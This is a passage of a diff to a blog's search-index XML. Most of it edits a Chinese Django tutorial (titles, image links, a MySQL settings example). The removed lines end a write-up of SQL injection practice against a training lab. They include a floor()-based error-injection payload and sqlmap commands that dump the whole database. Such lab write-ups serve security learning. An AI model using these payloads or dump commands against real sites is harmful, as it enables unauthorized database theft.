src="https://img.xpctf.cn/img/20200702084506.png" alt=""><br>后来我删了一个列，发现了报错注入，尝试了extractvalue报错注入无果<br><img src="https://img.xpctf.cn/img/20200702084931.png" alt=""><br>后来使用 floor注入发现成功了，payload：<code>and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x) a)</code><br><img src="https://img.xpctf.cn/img/20200702085136.png" alt=""></p>
-<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>昨晚找到floor报错注入，今天又用了sqlmap来跑，通过指定参数来爆破<br>语句：py -3 sqlmap.py -u “<a href="http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95&quot;">http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95&quot;</a> -p aid –batch<br>跑了一会发现三种注入方式，分别是布尔盲注，报错注入，时间盲注。<br><img src="https://img.xpctf.cn/img/20200702085619.png" alt=""><br>因为这是靶场，接下来就是脱库了，sqlmap比自己写脚本来的快，<br>语句：py -3 sqlmap.py -u “<a href="http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95&quot;">http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95&quot;</a> -p aid –dump-all –batch</p>
-<p><strong>测试结束</strong></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>SQL实战</tag>
       </tags>
   </entry>
   <entry>
@@ -1883,7 +1883,7 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>Django晋级学习</title>
     <url>/posts/2f99/</url>
     <content><![CDATA[<h2 id="Django-带参数的路由"><a href="#Django-带参数的路由" class="headerlink" title="Django 带参数的路由"></a>Django 带参数的路由</h2><h3 id="path对象"><a href="#path对象" class="headerlink" title="path对象"></a>path对象</h3><p>Django使用path对象来定义路由列表，path有四个参数：</p>
 <ul>
@@ -2052,7 +2052,7 @@
 > 
 
 内置常见过滤器方法：
-![](https://img.xpctf.cn/img/20201015093838.png-xpctf)
+![](https://img.xpctf.cn/img/20201015093838.png)
 
 - 自定义过滤器
 
@@ -2262,7 +2262,7 @@
 <p>在项⽬的 settings.py ⽂件中找到 DATABASES 配置项，将其信息修改为：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line"> <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line"> <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>, <span class="comment">#mysql数据库引擎</span></span><br><span class="line"> <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="comment">#数据库名</span></span><br><span class="line"> <span class="string">&#x27;HOST&#x27;</span>:<span class="string">&#x27;localhost&#x27;</span>, <span class="comment">#数据库服务器地址</span></span><br><span class="line"> <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="comment">#mysql数据库⽤户名</span></span><br><span class="line"> <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;test123&#x27;</span>, <span class="comment">#密码</span></span><br><span class="line"> <span class="string">&#x27;PORT&#x27;</span>:<span class="number">3306</span>, <span class="comment">#端⼝号，可选</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><p><img src="https://img.xpctf.cn/img/20201015201440.png-xpctf" alt=""></p>
+<h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><p><img src="https://img.xpctf.cn/img/20201015201440.png" alt=""></p>
 <p>对象关系映射（Oject Relational Mapping，简称ORM）模式是⼀种为了解决⾯向 对象与关系数据库存在的互不匹配的现象的技术。简单的说，ORM是通过使⽤描 述对象和数据库之间映射的元数据，⾃动⽣成sql语句，将程序中的对象⾃动保存 到关系数据库中。</p>
 <p><strong>优点：</strong></p>
 <ul>
@@ -2276,7 +2276,7 @@
 <li>对复杂sql⽆能为⼒ </li>
 <li>增加了学习成本</li>
 </ul>
-<p><img src="https://img.xpctf.cn/img/20201015202706.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20201015202706.png" alt=""></p>
 <h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><table>
 <thead>
 <tr>
